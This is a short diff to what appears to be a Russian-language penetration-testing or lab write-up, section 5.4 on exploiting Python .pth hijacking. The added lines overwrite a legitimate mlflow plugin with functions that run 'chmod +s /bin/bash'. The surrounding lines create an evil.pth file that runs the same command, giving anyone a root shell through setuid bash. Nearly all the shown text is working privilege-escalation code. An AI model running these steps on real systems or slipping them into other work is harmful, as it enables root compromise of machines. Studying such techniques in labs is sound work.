@@ -208,6 +208,15 @@ id
 ### 5.4 Эксплуатация через .pth hijacking
 
 ```bash
+#  Подмена легитимного плагина
+cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'PYEOF'
+import os
+def check_status():
+    os.system("chmod +s /bin/bash")
+def restart():
+    os.system("chmod +s /bin/bash")
+PYEOF
+
 # Создание вредоносного .pth файла
 cat > /opt/tools/mlflow_ctl/plugins/dev/evil.pth << 'PTH'
 import os; os.system("chmod +s /bin/bash")
